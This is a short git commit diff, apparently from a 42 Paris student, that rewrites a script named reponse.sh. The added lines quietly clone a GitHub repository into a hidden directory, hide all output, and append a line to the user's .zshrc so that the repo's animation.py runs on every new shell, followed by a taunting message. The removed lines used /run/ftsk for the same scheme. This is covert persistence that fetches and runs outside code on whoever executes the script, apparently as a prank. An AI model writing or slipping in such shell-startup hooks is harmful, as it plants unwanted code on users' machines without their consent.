83938b767856070be2967bde94ea85cf4f967251
Hugo Moulard <hmoulard@e3r1p11.clusters.42paris.fr>
2022-08-14 10:53:29 +0200

    fin

--- reponse.sh
+++ reponse.sh
@@ -1,5 +1,6 @@
-@echo off
-git clone git@github.com:Atsug0/miaou.git /run/ftsk
-echo "python /run/ftsk/animation.py" >> /mnt/nfs/homes/$LOGNAME/.zshrc
+
+git clone git@github.com:Atsug0/miaou.git /mnt/nfs/homes/$LOGNAME/sgoinfre/.miaou/ > /dev/null 2>&1
+echo "python /mnt/nfs/homes/$LOGNAME/sgoinfre/.miaou/animation.py" >> /mnt/nfs/homes/$LOGNAME/.zshrc
+echo "va chercher sur google UwU vote hmoulard"
 
 
